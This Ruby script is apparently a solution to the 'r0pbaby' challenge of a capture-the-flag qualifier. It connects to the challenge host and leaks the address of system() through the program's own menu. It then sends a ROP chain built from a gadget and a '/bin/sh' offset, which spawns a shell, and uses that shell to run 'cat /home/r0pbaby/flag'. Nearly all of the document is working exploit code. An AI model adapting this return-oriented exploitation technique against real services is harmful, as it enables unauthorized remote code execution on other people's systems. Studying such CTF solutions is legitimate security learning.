#!/usr/bin/ruby

require 'socket'

SH_OFFSET_REAL = 0x13669b
SH_OFFSET_MINE = 0x11f71c

GADGET_OFFSET_REAL = 0xb3e39
GADGET_OFFSET_MINE = 0xa7969

#HOST = "localhost"
HOST = "r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me"

PORT = 10436

s = TCPSocket.new(HOST, PORT)

# Receive until the string matches the regex, then delete everything
# up to the regex
def recv_until(s, regex)
  buffer = ""

  loop do
    buffer += s.recv(1024)
    if(buffer =~ /#{regex}/m)
      return buffer.gsub(/.*#{regex}/m, '')
    end
  end
end

# Get the address of "system"
puts("Getting the address of system()...")
s.write("2\n")
s.write("system\n")
system_addr = recv_until(s, "Symbol system: ").to_i(16)
puts("system() is at 0x%08x" % system_addr)

# Build the ROP chain
puts("Building the ROP chain...")
payload = "AAAAAAAA" +
  [system_addr + GADGET_OFFSET_REAL].pack("<Q") + # address of the gadget
  [system_addr].pack("<Q") +                      # address of system
  [system_addr + SH_OFFSET_REAL].pack("<Q") +     # address of "/bin/sh"
  ""

# Write the ROP chain
puts("Sending the ROP chain...")
s.write("3\n")
s.write("#{payload.length}\n")
s.write(payload)

# Tell the program to exit
puts("Exiting the program...")
s.write("4\n")

# Give sh some time to start
puts("Pausing...")
sleep(1)

# Write the command we want to run
puts("Attempting to read the flag!")
s.write("cat /home/r0pbaby/flag\n")

# Receive forever
loop do
  x = s.recv(1024)

  if(x.nil? || x == "")
    puts("Done!")
    exit
  end
  puts(x)
end
